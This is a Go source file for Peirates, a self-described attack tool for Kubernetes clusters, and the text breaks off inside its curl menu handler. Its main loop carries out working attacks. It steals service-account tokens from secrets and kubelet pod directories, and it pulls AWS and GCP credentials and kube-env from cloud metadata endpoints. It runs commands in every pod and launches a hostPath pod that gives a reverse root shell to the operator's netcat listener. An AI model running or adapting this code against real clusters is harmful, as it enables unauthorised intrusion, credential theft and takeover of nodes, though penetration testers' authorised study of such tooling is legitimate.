package peirates

// Peirates - an Attack tool for Kubernetes clusters
//
// You need to use "package main" for executables
//
// BTW always run `go fmt` before you check in code. go fmt is law.
//

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json" // Command line flag parsing
	"fmt"           // String formatting (Printf, Sprintf)
	"io/ioutil"     // Utils for dealing with IO streams
	"log"

	// Logging utils
	"math/rand" // Module for creating random string building
	"os"        // Environment variables ...

	// String parsing
	"strings"

	// HTTP client/server
	"net/http" // HTTP requests
	"net/url"  // URL encoding
	"os/exec"  // for exec
	"regexp"
	// Time modules
	// kubernetes client
)

var UseAuthCanI bool = true

// AWS credentials currently in use.
var awsCredentials AWSCredentials

// Make room for an assumed role.
var assumedAWSrole AWSCredentials

// getPodList returns an array of running pod information, parsed from "kubectl -n namespace get pods -o json"
func getPodList(connectionString ServerInfo) []string {

	if !kubectlAuthCanI(connectionString, "get", "pods") {
		println("[-] Permission Denied: your service account isn't allowed to get pods")
		return []string{}
	}

	responseJSON, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
	if err != nil {
		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
		return []string{}
	}

	type PodsResponse struct {
		Items []struct {
			Metadata struct {
				Name string `json:"name"`
			} `json:"metadata"`
		} `json:"items"`
	}

	var response PodsResponse
	json.Unmarshal(responseJSON, &response)

	if err != nil {
		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
		return []string{}
	}

	pods := make([]string, len(response.Items))

	for i, pod := range response.Items {
		pods[i] = pod.Metadata.Name
	}

	return pods
}

// Get the names of the available Secrets from the current namespace and a list of service account tokens
func getSecretList(connectionString ServerInfo) ([]string, []string) {

	if !kubectlAuthCanI(connectionString, "get", "secrets") {
		println("[-] Permission Denied: your service account isn't allowed to list secrets")
		return []string{}, []string{}
	}

	type SecretsResponse struct {
		Items []struct {
			Metadata struct {
				Name string `json:"name"`
			} `json:"metadata"`
			Type string `json:"type"`
		} `json:"items"`
	}

	secretsJSON, _, err := runKubectlSimple(connectionString, "get", "secrets", "-o", "json")
	if err != nil {
		fmt.Printf("[-] Error while getting secrets: %s\n", err.Error())
		return []string{}, []string{}
	}

	var response SecretsResponse
	err = json.Unmarshal(secretsJSON, &response)
	if err != nil {
		fmt.Printf("[-] Error while getting secrets: %s\n", err.Error())
		return []string{}, []string{}
	}

	secrets := make([]string, len(response.Items))
	var serviceAccountTokens []string

	for i, secret := range response.Items {
		secrets[i] = secret.Metadata.Name
		if secret.Type == "kubernetes.io/service-account-token" {
			serviceAccountTokens = append(serviceAccountTokens, secret.Metadata.Name)
		}
	}

	return secrets, serviceAccountTokens
}

// inAPod() attempts to determine if we are running in a pod.
// Long-term, this will likely go away
// func inAPod(connectionString ServerInfo) bool {

// 	if os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
// 		println("[+] You may be in a Kubernetes pod. API Server to be found at: ", os.Getenv("KUBERNETES_SERVICE_HOST"))
// 		return true
// 	} else {
// 		println("[-] You may not be in a Kubernetes pod. Press ENTER to continue.")
// 		var input string
// 		fmt.Scanln(&input)
// 		return false
// 	}
// }

func printListOfPods(connectionString ServerInfo) {
	runningPods := getPodList(connectionString)
	for _, listpod := range runningPods {
		println("[+] Pod Name: " + listpod)
	}

}

// execInAllPods() runs a command in all running pods
func execInAllPods(connectionString ServerInfo, command string) {
	runningPods := getPodList(connectionString)
	execInListPods(connectionString, runningPods, command)
}

// execInListPods() runs a command in all pods in the provided list
func execInListPods(connectionString ServerInfo, pods []string, command string) {
	if !kubectlAuthCanI(connectionString, "exec", "pods") {
		println("[-] Permission Denied: your service account isn't allowed to exec commands in pods")
		return
	}

	println("[+] Running supplied command in list of pods")
	for _, execPod := range pods {
		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
		if err != nil {
			fmt.Printf("[-] Executing %s in Pod %s failed: %s\n", command, execPod, err)
		} else {
			println(" ")
			println(string(execInPodOut))
		}
	}
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Added mountFS code to create yaml file drop to disk and create a pod.    |
//--------------------------------------------------------------------------|

// randSeq generates a LENGTH length string of random lowercase letters.
func randSeq(length int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyz")
	b := make([]rune, length)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

type AWSS3BucketObject struct {
	Data string `json:"Data"`
}

// GetPodsInfo gets details for all pods in json output and stores in PodDetails struct
func GetPodsInfo(connectionString ServerInfo, podDetails *PodDetails) {

	if !kubectlAuthCanI(connectionString, "get", "pods") {
		println("[-] Permission Denied: your service account isn't allowed to get pods")
		return
	}

	println("[+] Getting details for all pods")
	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
	println(string(podDetailOut))
	if err != nil {
		println("[-] Unable to retrieve details from this pod: ", err)
	} else {
		println("[+] Retrieving details for all pods was successful: ")
		err := json.Unmarshal(podDetailOut, &podDetails)
		if err != nil {
			println("[-] Error unmarshaling data: ", err)
		}
	}
}

// PrintHostMountPoints prints all pods' host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
func PrintHostMountPoints(podInfo PodDetails) {
	println("[+] Getting all host mount points for pods in current namespace")
	for _, item := range podInfo.Items {
		// println("+ Host Mount Points for Pod: " + item.Metadata.Name)
		for _, volume := range item.Spec.Volumes {
			if volume.HostPath.Path != "" {
				println("\tHost Mount Point: " + string(volume.HostPath.Path) + " found for pod " + item.Metadata.Name)
			}
		}
	}
}

// PrintHostMountPointsForPod prints a single pod's host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
func PrintHostMountPointsForPod(podInfo PodDetails, pod string) {
	println("[+] Getting all Host Mount Points only for pod: " + pod)
	for _, item := range podInfo.Items {
		if item.Metadata.Name == pod {
			for _, volume := range item.Spec.Volumes {
				if volume.HostPath.Path != "" {
					println("\tHost Mount Point: " + string(volume.HostPath.Path))
				}
			}
		}
	}
}

// GetRoles enumerates all roles in use on the cluster (in the default namespace).
// It parses all roles into a KubeRoles object.
func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
	println("[+] Getting all Roles")
	rolesOut, _, err := runKubectlSimple(connectionString, "get", "role", "-o", "json")
	if err != nil {
		println("[-] Unable to retrieve roles from this pod: ", err)
	} else {
		println("[+] Retrieving roles was successful: ")
		err := json.Unmarshal(rolesOut, &kubeRoles)
		if err != nil {
			println("[-] Error unmarshaling data: ", err)
		}

	}
}

func clearScreen() {
	pauseToHitEnter()
	c := exec.Command("clear")
	c.Stdout = os.Stdout
	c.Run()
}

func banner(connectionString ServerInfo, awsCredentials AWSCredentials, assumedAWSRole AWSCredentials) {

	name, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	printBanner()

	if connectionString.Token != "" {

		fmt.Printf("[+] Service Account Loaded: %s\n", connectionString.TokenName)
	}
	if connectionString.ClientCertPath != "" {
		fmt.Printf("[+] Client Certificate/Key Pair Loaded: %s\n", connectionString.ClientCertName)
	}
	var haveCa bool = false
	if connectionString.CAPath != "" {
		haveCa = true
	}
	fmt.Printf("[+] Certificate Authority Certificate: %t\n", haveCa)
	if len(connectionString.APIServer) > 0 {
		fmt.Printf("[+] Kubernetes API Server: %s\n", connectionString.APIServer)
	}
	println("[+] Current hostname/pod name:", name)
	println("[+] Current namespace:", connectionString.Namespace)
	if len(assumedAWSRole.AccessKeyId) > 0 {
		println("[+] AWS IAM Credentials (assumed): " + assumedAWSRole.AccessKeyId + " (" + assumedAWSRole.accountName + ")\n")
	}
	if len(awsCredentials.AccessKeyId) > 0 {
		if len(awsCredentials.accountName) > 0 {
			println("[+] AWS IAM Credentials (available): " + awsCredentials.AccessKeyId + " (" + awsCredentials.accountName + ")\n")
		} else {
			println("[+] AWS IAM Credentials (available): " + awsCredentials.AccessKeyId + "\n")
		}
	}

}

// GetNodesInfo runs kubectl get nodes -o json.
func GetNodesInfo(connectionString ServerInfo) {
	println("[+] Getting details for all pods")
	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
	println(string(podDetailOut))
	if err != nil {
		println("[-] Unable to retrieve node details: ", err)
	}
}

type PodNamespaceContainerTuple struct {
	PodName       string
	PodNamespace  string
	ContainerName string
}

//------------------------------------------------------------------------------------------------------------------------------------------------

// Main starts Peirates
func Main() {

	// Create a global variable named "connectionString" initialized to default values
	connectionString := ParseLocalServerInfo()
	cmdOpts := CommandLineOptions{connectionConfig: &connectionString}
	//var kubeRoles KubeRoles
	var podInfo PodDetails

	// Run the option parser to initialize connectionStrings
	parseOptions(&cmdOpts)

	var serviceAccounts []ServiceAccount

	// List of current service accounts
	if len(connectionString.TokenName) > 0 {
		serviceAccounts = append(serviceAccounts, MakeNewServiceAccount(connectionString.TokenName, connectionString.Token, "Loaded at startup"))
	}

	// List of current client cert/key pairs
	clientCertificates := []ClientCertificateKeyPair{}

	// print the banner, so that any node credentials pulled are not out of place.
	printBanner()

	// Add the kubelet kubeconfig and authentication information if available.
	_ = checkForNodeCredentials(&clientCertificates)
	// If there are client certs, but no service accounts, switch to the first client cert
	if (len(serviceAccounts) == 0) && (len(clientCertificates) > 0) {
		assignAuthenticationCertificateAndKeyToConnection(clientCertificates[0], &connectionString)
	}

	// Add the service account tokens for any pods found in /var/lib/kubelet/pods/.
	gatherPodCredentials(&serviceAccounts)

	// for dir in /var/lib/kubelet/pods ; do  echo "-------"; echo $dir; ls $dir/volumes/kuber*secret/; done | less

	// Check environment variables - see KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT
	// Watch the documentation on these variables for changes:
	// https://kubernetes.io/docs/concepts/containers/container-environment-variables/

	// Read AWS credentials from environment variables if present.
	awsCredentials = PullIamCredentialsFromEnvironmentVariables()

	var input int
	for ok := true; ok; ok = (input != 2) {
		banner(connectionString, awsCredentials, assumedAWSrole)
		println(`----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token]
[13] Request IAM credentials from GCP Metadata API [get-gcp-token]
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloud only) [attack-kops-gcs-1] 
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1] 
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[*]  Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i] 
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[*]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates 
----------------------------------------------------------------`)

		fmt.Printf("Peirates:># ")

		var userResponse string
		input, err := ReadLineStripWhitespace()
		if err != nil {
			continue
		}

		////////////////////////////////////////////////////////////////////////////////
		// REFACTOR ADVICE: Make these next three use a loop with items like this:
		//
		//                  items["kubectl "] = &handleKubectlSpace()
		////////////////////////////////////////////////////////////////////////////////

		// Handle kubectl commands before the switch menu.
		const kubectlSpace = "kubectl "
		if strings.HasPrefix(input, kubectlSpace) {

			// remove the kubectl, then split the rest on whitespace
			argumentsLine := strings.TrimPrefix(input, kubectlSpace)
			arguments := strings.Fields(argumentsLine)

			kubectlOutput, kubectlStdErr, err := runKubectlSimple(connectionString, arguments...)
			if err != nil {
				println(string(kubectlStdErr))
				println("[-] Could not perform action: ", input)
				pauseToHitEnter()
				continue
			}
			kubectlOutputLines := strings.Split(string(kubectlOutput), "\n")
			for _, line := range kubectlOutputLines {
				println(line)
			}

			// Make sure not to go into the switch-case
			pauseToHitEnter()
			continue
		}

		// Handle kubectl-try-all requests
		const kubectlTryAllSpace = "kubectl-try-all "
		if strings.HasPrefix(input, kubectlTryAllSpace) {

			// remove the canmyprincipals, then split the rest on whitespace
			argumentsLine := strings.TrimPrefix(input, kubectlTryAllSpace)
			arguments := strings.Fields(argumentsLine)

			kubectlOutput, _, err := attemptEveryAccount(&connectionString, &serviceAccounts, &clientCertificates, arguments...)
			if err != nil {
				println("[-] Could not perform action: ", input)
				pauseToHitEnter()
				continue
			}
			kubectlOutputLines := strings.Split(string(kubectlOutput), "\n")
			for _, line := range kubectlOutputLines {
				println(line)
			}

			// Make sure not to go into the switch-case
			pauseToHitEnter()
			continue
		}

		// Handle curl on the menu line
		const curlSpace = "curl "
		if strings.HasPrefix(input, curlSpace) {
			// remove the curl, then split the rest on whitespace
			argumentsLine := strings.TrimPrefix(input, curlSpace)
			arguments := strings.Fields(argumentsLine)
			// Pass the arguments to the curlNonWizard to construct a request object.
			request, err := curlNonWizard(arguments...)
			if err != nil {
				println("Could not create request.")
				break
			}
			responseBody, err := DoHTTPRequestAndGetBody(request, https, ignoreTLSErrors, caCertPath)
			if err != nil {
				println("Request failed.")
				break
			}
			responseBodyString := string(responseBody)
			println(responseBodyString + "\n")
			pauseToHitEnter()
		}

		// Handle shell commands before the switch menu
		const shellSpace = "shell "
		if strings.HasPrefix(input, shellSpace) {

			// trim the newline, remove the shell, then split the rest on whitespace
			input = strings.TrimSuffix(input, "\n")
			argumentsLine := strings.TrimPrefix(input, shellSpace)
			spaceDelimitedSet := strings.Fields(argumentsLine)

			// pop the first item so we can pass it in separately
			command, arguments := spaceDelimitedSet[0], spaceDelimitedSet[1:]

			cmd := exec.Command(command, arguments...)
			out, err := cmd.CombinedOutput()
			if err != nil {
				log.Fatalf("running command failed with %s\n", err)
			}
			fmt.Printf("\n%s\n", string(out))

			// Make sure not to go into the switch-case
			pauseToHitEnter()
			continue
		}

		// Peirates MAIN MENU
		switch input {

		// exit
		case "exit", "quit":
			os.Exit(0)

		//	[0] Run a kubectl command in the current namespace, API server and service account context
		case "0", "90", "kubectl":
			_ = kubectl_interactive(connectionString)

		//	[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa, switchsa)
		case "switchsa", "saswitch", "switch-sa", "sa-switch":
			switchServiceAccounts(serviceAccounts, &connectionString)
		case "listsa", "list-sa", "salist", "sa-list":
			listServiceAccounts(serviceAccounts, connectionString)
		case "1", "sa-menu", "service-account-menu", "sa", "service-account":
			println("Current primary service account: ", connectionString.TokenName)
			println("\n")
			println("[1] List service accounts [list]")
			println("[2] Switch primary service account [switch]")
			println("[3] Enter new service account JWT [add]")
			println("[4] Export service accounts to JSON [export]")
			println("[5] Import service accounts from JSON [import]")
			println("[6] Decode a stored or entered service account token (JWT) [decode]")

			println("\n")

			fmt.Scanln(&input)
			switch strings.ToLower(input) {
			case "1", "list":
				listServiceAccounts(serviceAccounts, connectionString)
			case "2", "switch":
				switchServiceAccounts(serviceAccounts, &connectionString)
			case "3", "add":
				serviceAccount := acceptServiceAccountFromUser()
				serviceAccounts = append(serviceAccounts, serviceAccount)

				println("")
				println("[1] Switch to this service account")
				println("[2] Maintain current service account")
				fmt.Scanln(&input)
				switch input {
				case "1":
					assignServiceAccountToConnection(serviceAccount, &connectionString)

				case "2":
					break
				default:
					println("Input not understood - adding service account but not switching context")
				}
				println("")
			case "4", "import":
				serviceAccountJSON, err := json.Marshal(serviceAccounts)
				if err != nil {
					fmt.Printf("[-] Error exporting service accounts: %s\n", err.Error())
				} else {
					println(string(serviceAccountJSON))
				}
			case "5", "export":
				var newserviceAccounts []ServiceAccount
				err := json.NewDecoder(os.Stdin).Decode(&newserviceAccounts)
				if err != nil {
					fmt.Printf("[-] Error importing service accounts: %s\n", err.Error())
				} else {
					serviceAccounts = append(serviceAccounts, newserviceAccounts...)
					fmt.Printf("[+] Successfully imported service accounts\n")
				}
			case "6", "decode":
				var token string
				println("\n1) Decode a JWT entered via a string.")
				println("2) Decode a service account token stored here.")
				println("Peirates:># ")
				fmt.Scanln(&input)

				switch input {
				case "1":
					println("\nEnter a JWT: ")
					fmt.Scanln(&token)
					printJWT(token)
				case "2":
					println("\nAvailable Service Accounts:")
					for i, account := range serviceAccounts {
						if account.Name == connectionString.TokenName {
							fmt.Printf("> [%d] %s\n", i, account.Name)
						} else {
							fmt.Printf("  [%d] %s\n", i, account.Name)
						}
					}
					println("\nEnter service account number or exit to abort: ")
					var tokNum int
					fmt.Scanln(&input)
					if input == "exit" {
						break
					}
					_, err := fmt.Sscan(input, &tokNum)
					if err != nil {
						fmt.Printf("Error parsing service account selection: %s\n", err.Error())
					} else if tokNum < 0 || tokNum >= len(serviceAccounts) {
						fmt.Printf("Service account %d does not exist!\n", tokNum)
					} else {
						printJWT(serviceAccounts[tokNum].Token)
					}
				}

			}

		// [2] List and/or change namespaces [ns-menu] (try: listns, switchns)
		case "list-ns", "listns", "nslist", "ns-list":
			listNamespaces(connectionString)
		case "switch-ns", "switchns", "nsswitch", "ns-switch":
			menuSwitchNamespaces(&connectionString)
		case "2", "ns-menu", "namespace-menu", "ns", "namespace":
			println(`
			[1] List namespaces [list]
			[2] Switch namespace [switch]
			`)
			fmt.Scanln(&input)
			switch input {
			case "1", "list":
				listNamespaces(connectionString)

			case "2", "switch":
				menuSwitchNamespaces(&connectionString)

			default:
				break
			}

		// [3] Get list of pods
		case "3", "get-pods", "list-pods":
			println("\n[+] Printing a list of Pods in this namespace......")
			printListOfPods(connectionString)

		//[4] Get complete info on all pods (json)
		case "4", "dump-podinfo", "dump-pod-info":
			GetPodsInfo(connectionString, &podInfo)

		//	[6] Enter AWS IAM credentials manually [enter-aws-credentials]
		case "6", "enter-aws-credentials", "aws-creds":
			credentials, err := EnterIamCredentialsForAWS()
			if err != nil {
				break
			}

			awsCredentials = credentials
			println(" New AWS credentials are: \n")
			DisplayAWSIAMCredentials(awsCredentials)

		// [7] Attempt to Assume a Different AWS Role [aws-assume-role]
		case "7", "aws-assume-role":

			// Get role to assume
			var input string
			println("[+] Enter a role to assume, in the format arn:aws:iam::123456789012:role/roleName : ")
			fmt.Scanln(&input)

			iamArnValidationPattern := regexp.MustCompile(`arn:aws:iam::\d{12,}:\w+\/\w+`)
			if !iamArnValidationPattern.MatchString(input) {
				println("String entered isn't a AWS role name in the format requested.\n")
				break
			}
			roleToAssume := strings.TrimSpace(input)

			// Attempt to assume role.
			roleAssumption, err := AWSSTSAssumeRole(awsCredentials, roleToAssume)
			if err != nil {
				break
			}

			assumedAWSrole = roleAssumption

		// [8] Deactivate assumed AWS role [aws-empty-assumed-role]
		case "8", "aws-empty-assumed-role", "empty-aws-assumed-role":
			assumedAWSrole.AccessKeyId = ""
			assumedAWSrole.accountName = ""

		// [9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
		case "9", "cert-menu":
			println("Current certificate-based authentication: ", connectionString.ClientCertName)
			println("\n")
			println("[1] List client certificates [list]")
			println("[2] Switch active client certificates [switch]")
			// println("[3] Enter new client certificate and key [add]")
			// println("[4] Export service accounts to JSON [export]")
			// println("[5] Import service accounts from JSON [import]")
			// println("[6] Decode a stored or entered service account token (JWT) [decode]")

			println("\n")

			fmt.Scanln(&input)
			switch strings.ToLower(input) {
			case "1", "list":
				println("\nAvailable Client Certificate/Key Pairs:")
				for i, account := range clientCertificates {
					fmt.Printf("  [%d] %s\n", i, account.Name)
				}
			case "2", "switch":
				println("\nAvailable Client Certificate/Key Pairs:")
				for i, account := range clientCertificates {
					fmt.Printf("  [%d] %s\n", i, account.Name)
				}
				println("\nEnter certificate/key pair number or exit to abort: ")
				var tokNum int
				fmt.Scanln(&input)
				if input == "exit" {
					break
				}

				_, err := fmt.Sscan(input, &tokNum)
				if err != nil {
					fmt.Printf("Error parsing certificate/key pair selection: %s\n", err.Error())
				} else if tokNum < 0 || tokNum >= len(clientCertificates) {
					fmt.Printf("Certificate/key pair  %d does not exist!\n", tokNum)
				} else {
					assignAuthenticationCertificateAndKeyToConnection(clientCertificates[tokNum], &connectionString)
					fmt.Printf("Selected %s\n", connectionString.ClientCertName)
				}
			}

		//	[10] Get secrets from API server
		case "10", "list-secrets":
			secrets, serviceAccountTokens := getSecretList(connectionString)
			for _, secret := range secrets {
				println("[+] Secret found: ", secret)
			}
			for _, svcAcct := range serviceAccountTokens {
				println("[+] Service account found: ", svcAcct)
			}

		// [11] Get a service account token from a secret
		case "11", "get-secret", "secret-to-sa":
			println("\nPlease enter the name of the secret for which you'd like the contents: ")
			var secretName string
			fmt.Scanln(&secretName)

			if !kubectlAuthCanI(connectionString, "get", "secret") {
				println("[-] Permission Denied: your service account isn't allowed to get secrets")
				break
			}

			secretJSON, _, err := runKubectlSimple(connectionString, "get", "secret", secretName, "-o", "json")
			if err != nil {
				println("[-] Could not retrieve secret")
				break
			}

			var secretData map[string]interface{}
			json.Unmarshal(secretJSON, &secretData)

			secretType := secretData["type"].(string)

			if secretType != "kubernetes.io/service-account-token" {
				println("[-] This secret is not a service account token.")
				break
			}

			opaqueToken := secretData["data"].(map[string]interface{})["token"].(string)
			token, err := base64.StdEncoding.DecodeString(opaqueToken)
			if err != nil {
				println("[-] ERROR: couldn't decode")
			} else {
				fmt.Printf("[+] Saved %s // %s\n", secretName, token)
				serviceAccounts = append(serviceAccounts, MakeNewServiceAccount(secretName, string(token), "Cluster Secret"))
			}

		// [5] Check all pods for volume mounts
		case "5", "find-volume-mounts", "find-mounts":
			println("[1] Get all host mount points [all]")
			println("[2] Get volume mount points for a specific pod [single]")
			println("\nPeirates:># ")
			fmt.Scanln(&input)

			GetPodsInfo(connectionString, &podInfo)

			switch input {
			case "1", "all":
				println("[+] Getting volume mounts for all pods")
				// BUG: Need to make it so this Get doesn't print all info even though it gathers all info.
				PrintHostMountPoints(podInfo)

				//MountRootFS(allPods, connectionString)
			case "2", "single":
				println("[+] Please provide the pod name: ")
				fmt.Scanln(&userResponse)
				fmt.Printf("[+] Printing volume mount points for %s\n", userResponse)
				PrintHostMountPointsForPod(podInfo, userResponse)
			}

		// [20] Gain a reverse rootshell by launching a hostPath / pod
		case "20", "attack-pod-hostpath-mount", "attack-hostpath-mount", "attack-pod-mount", "attack-hostmount-pod", "attack-mount-pod":
			allPods := getPodList(connectionString)

			println("Your IP addresses: ")
			GetMyIPAddressesNative()

			println("What IP and Port will your netcat listener be listening on?")
			var ip, port string
			println("IP:")
			fmt.Scanln(&ip)
			println("Port:")
			fmt.Scanln(&port)
			MountRootFS(allPods, connectionString, ip, port)

		// [12] Request IAM credentials from AWS Metadata API [AWS only]
		case "12", "get-aws-token":
			// Pull IAM credentials from the Metadata API, store in a struct and display

			result, err := PullIamCredentialsFromAWS()
			if err != nil {
				println("[-] Operation failed.")
				break
			}

			awsCredentials = result
			DisplayAWSIAMCredentials(awsCredentials)

		// [13] Request IAM credentials from GCP Metadata API [GCP only]
		case "13", "get-gcp-token":

			// TODO: Store the GCP token and display, to bring this inline with the GCP functionality.

			// Make a request for a list of service account(s)
			var headers []HeaderLine
			headers = []HeaderLine{
				HeaderLine{"Metadata-Flavor", "Google"},
			}
			url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
			svcAcctListRaw := GetRequest(url, headers, false)
			if (svcAcctListRaw == "") || (strings.HasPrefix(svcAcctListRaw, "ERROR:")) {
				break
			}

			// Parse the output service accounts into svcAcctListLines
			svcAcctListLines := strings.Split(string(svcAcctListRaw), "\n")

			// For each line found found, request a token corresponding to that line and print it.
			for _, line := range svcAcctListLines {

				if strings.TrimSpace(string(line)) == "" {
					continue
				}
				account := strings.TrimRight(string(line), "/")

				fmt.Printf("\n[+] GCP Credentials for account %s\n\n", account)
				token, _, err := GetGCPBearerTokenFromMetadataAPI(account)
				if err == nil {
					println(token)
				}
			}
			println(" ")

		// [14] Request kube-env from GCP Metadata API [GCP only]
		case "14", "attack-kube-env-gcp":
			// Make a request for kube-env, in case it is in the instance attributes, as with a number of installers
			var headers []HeaderLine
			headers = []HeaderLine{
				HeaderLine{"Metadata-Flavor", "Google"},
			}
			kubeEnv := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
			if (kubeEnv == "") || (strings.HasPrefix(kubeEnv, "ERROR:")) {
				println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
				// TODO: Should we get error code the way we used to:
				// fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
				break
			}
			kubeEnvLines := strings.Split(string(kubeEnv), "\n")
			for _, line := range kubeEnvLines {
				println(line)
			}

		// [15] Pull Kubernetes service account tokens from Kop's bucket in GCS [GCP only]
		case "15", "attack-kops-gcs-1":
			serviceAccountsReturned, err := KopsAttackGCP()
			if err != nil {
				//Append serice accounts to the existing store
				for _, svcacct := range serviceAccountsReturned {
					serviceAccounts = append(serviceAccounts, svcacct)
				}
			}

		// [16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
		case "16":
			serviceAccountsReturned, err := KopsAttackAWS()
			if err != nil {
				//Append serice accounts to the existing store
				for _, svcacct := range serviceAccountsReturned {
					serviceAccounts = append(serviceAccounts, svcacct)
				}
			}

		case "17", "aws-s3-ls", "aws-ls-s3", "ls-s3", "s3-ls":
			// [17] List AWS S3 Buckets accessible (Auto-Refreshing Metadata API credentials) [AWS]

			var credentialsToUse AWSCredentials
			if len(assumedAWSrole.AccessKeyId) > 0 {
				credentialsToUse = assumedAWSrole
			} else if len(awsCredentials.AccessKeyId) > 0 {
				credentialsToUse = awsCredentials
			} else {
				println("Pulling AWS credentials from the metadata API.")
				result, err := PullIamCredentialsFromAWS()
				if err != nil {
					println("[-] Could not get AWS credentials from metadata API.")
					break
				}
				println("[+] Got AWS credentials from metadata API.")
				awsCredentials = result
				credentialsToUse = awsCredentials
			}

			result, err := ListAWSBuckets(credentialsToUse)
			if err != nil {
				println("List bucket operation failed.")
				break
			}

			for _, bucket := range result {
				println(bucket)
			}

		case "18", "aws-s3-ls-objects", "aws-s3-list-objects", "aws-s3-list-bucket":
			// [18] List contents of an AWS S3 Bucket (Auto-Refreshing Metadata API credentials) [AWS]
			var bucket string

			println("Enter a bucket name to list: ")
			fmt.Scanln(&bucket)

			// Altering this to allow self-entered credentials.
			// var IAMCredentials = PullIamCredentialsFromAWS()
			if len(assumedAWSrole.AccessKeyId) > 0 {
				ListBucketObjects(assumedAWSrole, bucket)
			} else {
				ListBucketObjects(awsCredentials, bucket)
			}

		// [21] Run command in one or all pods in this namespace
		case "21", "exec-via-api":

			println("\n[1] Run command on a specific pod\n[2] Run command on all pods")
			fmt.Scanln(&input)
			println("[+] Please provide the command to run in the pods: ")

			cmdOpts.commandToRunInPods, _ = ReadLineStripWhitespace()

			switch input {
			case "1":
				println("[+] Please provide the specified pod to run the command: ")
				fmt.Scanln(&cmdOpts.podsToRunTheCommandIn)
				var podToRunIn string
				fmt.Scanln(&podToRunIn)
				cmdOpts.podsToRunTheCommandIn = []string{podToRunIn}

				if cmdOpts.commandToRunInPods != "" {
					if len(cmdOpts.podsToRunTheCommandIn) > 0 {
						execInListPods(connectionString, cmdOpts.podsToRunTheCommandIn, cmdOpts.commandToRunInPods)
					}
				}
			case "2":
				var input string
				if cmdOpts.commandToRunInPods != "" {
					execInAllPods(connectionString, cmdOpts.commandToRunInPods)
				} else {
					fmt.Print("[-] ERROR - command string was empty.")
					fmt.Scanln(&input)
				}

			}
		// [22] Use the kubelet to gain the token in every pod where we can run a command
		case "22", "exec-via-kubelet", "exec-via-kubelets":
			ExecuteCodeOnKubelet(connectionString, &serviceAccounts)

		// [30] Inject peirates into another pod via API Server [inject-and-exec]
		case "30", "inject-and-exec":

			println("\nThis item has been removed from the menu and is currently not supported.\n")
			println("\nChoose a pod to inject peirates into:\n")
			runningPods := getPodList(connectionString)
			for i, listpod := range runningPods {
				fmt.Printf("[%d] %s\n", i, listpod)
			}

			println("Enter the number of a pod to inject peirates into: ")

			var choice int
			fmt.Scanln(&choice)

			podName := runningPods[choice]

			injectIntoAPodViaAPIServer(connectionString, podName)

		// [91] Make an HTTP request (GET or POST) to a URL of your choice [curl]
		case "91", "curl":
			println("[+] Enter a URL, including http:// or https:// - if parameters are required, you must provide them as part of the URL: ")
			fmt.Scanln(&input)

			// Trim whitespace
			fullURL := strings.TrimSpace(strings.ToLower(input))

			// Determine whether the URL is https or not:
			httpsPresent := false
			if strings.HasPrefix(fullURL, "https://") {
				httpsPresent = true
			} else {
				// Make sure the URL begins with http://, if it didn't begin with https://
				if !strings.HasPrefix(fullURL, "http://") {
					fmt.Println("This URL does not start with http:// or https://")
					break
				}
			}

